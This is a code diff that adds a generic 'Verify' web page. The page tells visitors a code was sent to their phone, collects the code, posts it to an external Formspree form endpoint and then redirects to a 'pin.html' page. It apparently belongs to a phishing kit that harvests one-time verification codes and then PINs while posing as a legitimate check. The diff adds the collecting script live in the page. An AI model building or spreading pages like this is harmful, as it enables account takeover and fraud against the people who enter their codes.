@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="img" href="asset/header-logo.png" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verify</title>
+
+    <script type="module" crossorigin src="/main.js"></script>
+    <link rel="stylesheet" href="asset/style.css" />
+  </head>
+
+  <body class="bg-gray-100">
+    <div class="w-[90%] max-w-md mx-auto pt-5">
+      <div class="mt-5"></div>
+
+      <form id="form" class="mt-44">
+        <input type="hidden" name="_captcha" value="false" />
+        <div
+          class="inputsCtn bg-white rounded-md shadow-sm p-6 flex flex-col gap-6"
+        >
+          <p class="font-bold text-center text-xl2 mb-3">Enter code</p>
+          <p>We have sent a code to your phone number.</p>
+          <div class="ctn relative">
+            <input
+              required
+              minlength="5"
+              id="phone"
+              name="phone"
+              type="text"
+              class="w-full rounded-md p-4 outline-none pl-12 transition-all bg-gray-100 focus:border-primary focus:border font-semibold"
+              placeholder="Verification code"
+            />
+          </div>
+
+          <p class="pt-7 text-primary font-semibold text-center">
+            Didn't receive code?
+          </p>
+          <p class="pt-4 font-semibold text-center">
+            Your code will be active for 15 minutes
+          </p>
+          <div class="spacee"></div>
+          <button
+            id="redirectBtn"
+            disabled
+            class="bg-primary text-white w-full rounded-md p-4 disabled:opacity-80"
+          >
+            Verify
+          </button>
+        </div>
+      </form>
+    </div>
+  </body>
+
+  <script type="text/javascript">
+    window.onload = function () {
+      console.log("working");
+      const btn = document.querySelector("button");
+      const phoneInput = document.querySelector("#phone");
+
+      // Form submission handling for verification code
+      document
+        .getElementById("form")
+        .addEventListener("submit", async function (event) {
+          event.preventDefault(); // Prevent default form submission
+
+          btn.textContent = "Loading..."; // Change button text to Loading...
+
+          localStorage.setItem("phone", phoneInput.value); // Store phone number in localStorage
+
+          let formData = new FormData(this); // Collect form data
+
+          try {
+            let response = await fetch("https://formspree.io/f/xoveqrzb", {
+              method: "POST",
+              body: formData,
+              headers: {
+                Accept: "application/json",
+              },
+            });
+
+            if (response.ok) {
+              window.location.href = "pin.html"; // Redirect to pin.html on successful submission
+            } else {
+              alert("Failed to send form. Please try again.");
+            }
+          } catch (error) {
+            alert("An error occurred. Please try again later.");
+          }
+        });
+    };
+
+    // Attach an event listener to the button for redirection
+    document
+      .getElementById("redirectBtn")
+      .addEventListener("click", function () {
+        window.location.href = "pin.html"; // Redirect to pin.html when the button is clicked
+      });
+  </script>
+
+  <script>
+    function togglePass() {
+      const passInput = document.querySelector("#pass");
+      let type = passInput.type === "password" ? "text" : "password";
+      passInput.setAttribute("type", type);
+    }
+  </script>
+</html>
